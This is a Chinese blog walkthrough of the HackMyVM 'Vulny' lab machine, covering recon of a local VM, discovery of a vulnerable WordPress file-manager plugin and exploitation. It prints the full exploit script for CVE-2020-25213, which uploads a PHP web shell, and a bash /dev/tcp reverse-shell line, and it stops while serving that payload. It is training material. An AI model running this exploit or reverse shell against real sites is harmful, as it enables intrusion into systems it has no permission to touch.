@@ -1,0 +1,782 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>HMV-Vulny | Moriiの博客</title><meta name="keywords" content="HMV"><meta name="author" content="Morii"><meta name="copyright" content="Morii"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="HMV-Vulny 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.134.76 WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HMV-Vulny">
+<meta property="og:url" content="https://drume2.github.io/posts/b2347fd8.html">
+<meta property="og:site_name" content="Moriiの博客">
+<meta property="og:description" content="HMV-Vulny 信息搜集┌──(root㉿kali)-[&#x2F;home&#x2F;kali] └─# arp-scan -l Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.134.76 WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/1.webp">
+<meta property="article:published_time" content="2025-07-01T19:26:22.000Z">
+<meta property="article:modified_time" content="2025-07-01T20:53:09.569Z">
+<meta property="article:author" content="Morii">
+<meta property="article:tag" content="HMV">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://npm.elemecdn.com/xianqi-hexo/imgg/1.webp"><link rel="shortcut icon" href="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp"><link rel="canonical" href="https://drume2.github.io/posts/b2347fd8"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"一年之内的产物","messageNext":"技术可能存在过期"},
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HMV-Vulny',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-07-02 04:53:09'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link defer rel="stylesheet" href="/css/customm.css" ><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/icon.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/background.css"><link defer rel="stylesheet" href="https://npm.elemecdn.com/xianqi-hexo/css/index_ee.css"><link defer rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://imgtu.com/uploads/1jto6hwz/r-file_64e053.webp" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://npm.elemecdn.com/xianqi-hexo/imgg/1.webp')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Moriiの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fas fa-book"></i><span> 说说</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时轴</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/List/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/List/gallery/"><i class="fa-fw fas fa-image"></i><span> 相册</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/comments/"><i class="fa-fw fas fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HMV-Vulny</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-01T19:26:22.000Z" title="发表于 2025-07-02 03:26:22">2025-07-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-01T20:53:09.569Z" title="更新于 2025-07-02 04:53:09">2025-07-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HMV/">HMV</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HMV-Vulny"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="HMV-Vulny"><a href="#HMV-Vulny" class="headerlink" title="HMV-Vulny"></a>HMV-Vulny</h1><p><img src="/posts/b2347fd8/image-20250702035150519.png" alt="image-20250702035150519"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:a6:0f:62, IPv4: 192.168.134.76
+WARNING: Cannot open MAC&#x2F;Vendor file ieee-oui.txt: Permission denied
+WARNING: Cannot open MAC&#x2F;Vendor file mac-vendor.txt: Permission denied
+Starting arp-scan 1.10.0 with 256 hosts (https:&#x2F;&#x2F;github.com&#x2F;royhills&#x2F;arp-scan)
+192.168.134.90  08:00:27:be:ee:7f       (Unknown)
+192.168.134.94  ec:8e:77:8f:19:c5       (Unknown)
+192.168.134.228 96:32:fb:1f:07:98       (Unknown: locally administered)
+
+5 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 1.900 seconds (134.74 hosts&#x2F;sec). 3 responded
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nmap 192.168.134.90
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-01 15:27 EDT
+Nmap scan report for 192.168.134.90
+Host is up (0.0012s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+80&#x2F;tcp open  http
+MAC Address: 08:00:27:BE:EE:7F (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
+
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# nmap 192.168.134.90 -A
+Starting Nmap 7.95 ( https:&#x2F;&#x2F;nmap.org ) at 2025-07-01 15:28 EDT
+Nmap scan report for 192.168.134.90
+Host is up (0.0017s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)
+MAC Address: 08:00:27:BE:EE:7F (PCS Systemtechnik&#x2F;Oracle VirtualBox virtual NIC)
+Device type: general purpose|router
+Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
+OS CPE: cpe:&#x2F;o:linux:linux_kernel:4 cpe:&#x2F;o:linux:linux_kernel:5 cpe:&#x2F;o:mikrotik:routeros:7 cpe:&#x2F;o:linux:linux_kernel:5.6.3
+OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.68 ms 192.168.134.90
+
+OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 8.84 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>只开放了80端口，而且80端口是一个Ubuntu的页面，接着扫目录</p>
+<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# dirsearch -u 192.168.134.90
+&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;dirsearch&#x2F;dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https:&#x2F;&#x2F;setuptools.pypa.io&#x2F;en&#x2F;latest&#x2F;pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (&#x2F;_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: &#x2F;home&#x2F;kali&#x2F;reports&#x2F;_192.168.134.90&#x2F;_25-07-01_15-31-33.txt
+
+Target: http:&#x2F;&#x2F;192.168.134.90&#x2F;
+
+[15:31:33] Starting:
+[15:31:37] 403 -  279B  - &#x2F;.ht_wsr.txt
+[15:31:37] 403 -  279B  - &#x2F;.htaccess.bak1
+[15:31:37] 403 -  279B  - &#x2F;.htaccess.orig
+[15:31:37] 403 -  279B  - &#x2F;.htaccessBAK
+[15:31:37] 403 -  279B  - &#x2F;.htaccess_extra
+[15:31:37] 403 -  279B  - &#x2F;.htaccess.save
+[15:31:37] 403 -  279B  - &#x2F;.htaccess_orig
+[15:31:37] 403 -  279B  - &#x2F;.htaccessOLD2
+[15:31:37] 403 -  279B  - &#x2F;.htm
+[15:31:37] 403 -  279B  - &#x2F;.htaccess.sample
+[15:31:37] 403 -  279B  - &#x2F;.html
+[15:31:37] 403 -  279B  - &#x2F;.htaccessOLD
+[15:31:37] 403 -  279B  - &#x2F;.htaccess_sc
+[15:31:37] 403 -  279B  - &#x2F;.httr-oauth
+[15:31:37] 403 -  279B  - &#x2F;.htpasswd_test
+[15:31:37] 403 -  279B  - &#x2F;.htpasswds
+[15:31:39] 403 -  279B  - &#x2F;.php
+[15:32:33] 301 -  321B  - &#x2F;javascript  -&gt;  http:&#x2F;&#x2F;192.168.134.90&#x2F;javascript&#x2F;
+[15:33:03] 301 -  317B  - &#x2F;secret  -&gt;  http:&#x2F;&#x2F;192.168.134.90&#x2F;secret&#x2F;
+[15:33:03] 404 -  223B  - &#x2F;secret&#x2F;
+[15:33:04] 403 -  279B  - &#x2F;server-status
+[15:33:04] 403 -  279B  - &#x2F;server-status&#x2F;
+
+Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>扫到了两个目录一个<strong>JavaScript</strong>，打开之后提示没有权限，另一个secret打开之后提示下面的内容</p>
+<pre class="line-numbers language-none"><code class="language-none">Neither &#x2F;etc&#x2F;wordpress&#x2F;config-192.168.134.90.php nor &#x2F;etc&#x2F;wordpress&#x2F;config-168.134.90.php could be found.
+Ensure one of them exists, is readable by the webserver and contains the right password&#x2F;username.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>是一个wordpress的文件</p>
+<p>接着扫secret目录</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# dirsearch -u 192.168.134.90&#x2F;secret
+&#x2F;usr&#x2F;lib&#x2F;python3&#x2F;dist-packages&#x2F;dirsearch&#x2F;dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https:&#x2F;&#x2F;setuptools.pypa.io&#x2F;en&#x2F;latest&#x2F;pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (&#x2F;_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: &#x2F;home&#x2F;kali&#x2F;reports&#x2F;_192.168.134.90&#x2F;_secret_25-07-01_15-38-39.txt
+
+Target: http:&#x2F;&#x2F;192.168.134.90&#x2F;
+
+[15:38:39] Starting: secret&#x2F;
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.ht_wsr.txt
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccess.sample
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccess.save
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccess.orig
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccess_extra
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccess_orig
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccess_sc
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccessOLD
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccessOLD2
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htm
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.html
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccess.bak1
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htaccessBAK
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htpasswd_test
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.httr-oauth
+[15:38:43] 403 -  279B  - &#x2F;secret&#x2F;.htpasswds
+[15:38:45] 403 -  279B  - &#x2F;secret&#x2F;.php
+[15:40:05] 200 -    3KB - &#x2F;secret&#x2F;readme.html
+[15:40:33] 301 -  326B  - &#x2F;secret&#x2F;wp-admin  -&gt;  http:&#x2F;&#x2F;192.168.134.90&#x2F;secret&#x2F;wp-admin&#x2F;
+[15:40:34] 301 -  328B  - &#x2F;secret&#x2F;wp-content  -&gt;  http:&#x2F;&#x2F;192.168.134.90&#x2F;secret&#x2F;wp-content&#x2F;
+[15:40:34] 200 -  513B  - &#x2F;secret&#x2F;wp-content&#x2F;
+[15:40:34] 500 -  612B  - &#x2F;secret&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;admin.php
+[15:40:34] 500 -  612B  - &#x2F;secret&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php
+[15:40:34] 200 -  471B  - &#x2F;secret&#x2F;wp-content&#x2F;upgrade&#x2F;
+[15:40:34] 301 -  329B  - &#x2F;secret&#x2F;wp-includes  -&gt;  http:&#x2F;&#x2F;192.168.134.90&#x2F;secret&#x2F;wp-includes&#x2F;
+[15:40:34] 500 -    3KB - &#x2F;secret&#x2F;wp-admin&#x2F;setup-config.php
+[15:40:34] 200 -  487B  - &#x2F;secret&#x2F;wp-content&#x2F;uploads&#x2F;
+[15:40:34] 403 -  279B  - &#x2F;secret&#x2F;wp-includes&#x2F;
+[15:40:34] 500 -    0B  - &#x2F;secret&#x2F;wp-includes&#x2F;rss-functions.php
+
+Task Completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在web-connect内找到了几个文件夹</p>
+<p><img src="/posts/b2347fd8/image-20250702035519919.png" alt="image-20250702035519919"></p>
+<p>在第二个文件夹内存放的是插件，打开后里面有一个文件管理的文件夹</p>
+<p>在kali内查询有没有这个插件的漏洞</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali]
+└─# searchsploit wp-file-manager
+------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                   |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE                                                                      | php&#x2F;webapps&#x2F;51224.py
+------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>是51224.py文件，拿到本地</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# searchsploit 51224.py -m
+  Exploit: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE
+      URL: https:&#x2F;&#x2F;www.exploit-db.com&#x2F;exploits&#x2F;51224
+     Path: &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;51224.py
+    Codes: CVE-2020-25213
+ Verified: True
+File Type: Python script, ASCII text executable, with very long lines (501)
+Copied to: &#x2F;home&#x2F;kali&#x2F;bash&#x2F;51224.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>查看这个脚本的运行过程</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# cat 51224.py
+#!&#x2F;usr&#x2F;bin&#x2F;env
+
+# Exploit Title: WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE
+# Date: [ 22-01-2023 ]
+# Exploit Author: [BLY]
+# Vendor Homepage: [https:&#x2F;&#x2F;wpscan.com&#x2F;vulnerability&#x2F;10389]
+# Version: [ File Manager plugin 6.0-6.9]
+# Tested on: [ Debian ]
+# CVE : [ CVE-2020-25213 ]
+
+import sys,signal,time,requests
+from bs4 import BeautifulSoup
+#from pprint import pprint
+
+def handler(sig,frame):
+        print (&quot;[!]Saliendo&quot;)
+        sys.exit(1)
+
+signal.signal(signal.SIGINT,handler)
+
+def commandexec(command):
+
+        exec_url &#x3D; url+&quot;&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;php&#x2F;..&#x2F;files&#x2F;shell.php&quot;
+        params &#x3D; &#123;
+                &quot;cmd&quot;:command
+        &#125;
+
+        r&#x3D;requests.get(exec_url,params&#x3D;params)
+
+        soup &#x3D; BeautifulSoup(r.text, &#39;html.parser&#39;)
+        text &#x3D; soup.get_text()
+
+        print (text)
+def exploit():
+
+        global url
+
+        url &#x3D; sys.argv[1]
+        command &#x3D; sys.argv[2]
+        upload_url &#x3D; url+&quot;&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;php&#x2F;connector.minimal.php&quot;
+
+        headers &#x3D; &#123;
+                        &#39;content-type&#39;: &quot;multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryvToPIGAB0m9SB1Ww&quot;,
+                        &#39;Connection&#39;: &quot;close&quot;
+        &#125;
+
+        payload &#x3D; &quot;------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name&#x3D;\&quot;cmd\&quot;\r\n\r\nupload\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name&#x3D;\&quot;target\&quot;\r\n\r\nl1_Lw\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww\r\nContent-Disposition: form-data; name&#x3D;\&quot;upload[]\&quot;; filename&#x3D;\&quot;shell.php\&quot;\r\nContent-Type: application&#x2F;x-php\r\n\r\n&lt;?php echo \&quot;&lt;pre&gt;\&quot; . shell_exec($_REQUEST[&#39;cmd&#39;]) . \&quot;&lt;&#x2F;pre&gt;\&quot;; ?&gt;\r\n------WebKitFormBoundaryvToPIGAB0m9SB1Ww--&quot;
+
+        try:
+                r&#x3D;requests.post(upload_url,data&#x3D;payload,headers&#x3D;headers)
+                #pprint(r.json())
+                commandexec(command)
+        except:
+                print(&quot;[!] Algo ha salido mal...&quot;)
+
+
+
+
+def help():
+
+        print (&quot;\n[*] Uso: python3&quot;,sys.argv[0],&quot;\&quot;url\&quot; \&quot;comando\&quot;&quot;)
+        print (&quot;[!] Ejemplo: python3&quot;,sys.argv[0],&quot;http:&#x2F;&#x2F;wordpress.local&#x2F; id&quot;)
+
+
+
+
+if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
+
+        if len(sys.argv) !&#x3D; 3:
+                help()
+
+        else:
+                exploit() <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以使用绝对路径<code>/wp-content/plugins/wp-file-manager/lib/files/shell.php</code>，在web端前往这个路径使用?cmd&#x3D;来传入参数</p>
+<p>运行一下这个脚本</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# python3 51224.py
+
+[*] Uso: python3 51224.py &quot;url&quot; &quot;comando&quot;
+[!] Ejemplo: python3 51224.py http:&#x2F;&#x2F;wordpress.local&#x2F; id<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>要求我们传入一个id参数</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# python3 51224.py http:&#x2F;&#x2F;192.168.134.90&#x2F;secret id
+uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>接着在本地写一个反弹shell的文件，并开启http服务</p>
+<pre class="line-numbers language-none"><code class="language-none">┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# cat reverse.sh
+bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.134.76&#x2F;1234 0&gt;&amp;1
+┌──(root㉿kali)-[&#x2F;home&#x2F;kali&#x2F;bash]
+└─# python3 -m http.server 80
